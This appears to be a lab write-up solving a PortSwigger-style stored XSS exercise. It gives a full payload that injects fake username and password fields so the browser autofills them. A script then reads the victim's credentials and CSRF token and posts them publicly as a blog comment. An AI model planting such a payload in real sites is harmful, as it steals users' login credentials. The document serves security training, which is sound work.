# Description

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

Note 
> To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

> Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the credentials.

# Solution

Based on the previous tasks, we can understand that comments are vulnerable to any XXS attacks. 
So let's start creating our payload.

Let's insert the username and password fields using HTML elements.

```html
<input type="text" name="username">
<input type="password" name="password" onchange="success()">
```
<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS90.png" alt="XXS" />
</p>

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS86.png" alt="XXS" />
</p>

I added the onchange event. 
Onchange is an event in HTML that fires when the value has been changed and the input has been completed.
Therefore, we suggest that when the user enters the page, the browser immediately and automatically fills in the input fields, since the focus will not be on the input field, so onchange will fire.

The next step will be to determine our function. 

```html
<input type="text" name="username">
<input type="password" name="password" onchange="success()">

<script>
    function success() {
    var username = document.getElementsByName('username')[0].value
    var password = document.getElementsByName('password')[0].value
    var token = document.getElementsByName('csrf')[0].value
```

Here we declare our variables username, password, and token.

```html
<input type="text" name="username">
<input type="password" name="password" onchange="success()">

<script>
    function success() {
    var username = document.getElementsByName('username')[0].value
    var password = document.getElementsByName('password')[0].value
    var token = document.getElementsByName('csrf')[0].value
    var data = new FormData();

    data.append('csrf', token);
    data.append('postId', 10);
    data.append('comment', `${username}:${password}`);
    data.append('name', 'test');
    data.append('email', 'test@test.com');
    data.append('website', 'http://test.com');

    fetch('/post/comment', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
    };
</script>
```
add the necessary data to send a comment and send it using the POST method

This is what our payload should look like in the end. Let's send it and see the result.

> Important! in PostID Specify the correct endpoint where the comment will be sent.

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS87.png" alt="XXS" />
</p>

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS88.png" alt="XXS" />
</p>

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS89.png" alt="XXS" />
</p>

As you can see, our attack worked as planned. After sending the comment, the administrator viewed the blog and browser, automatically filled in the fields, and performed our function. This led to the publication of the username and password. We enter the login form, enter the data, and pass the lab.
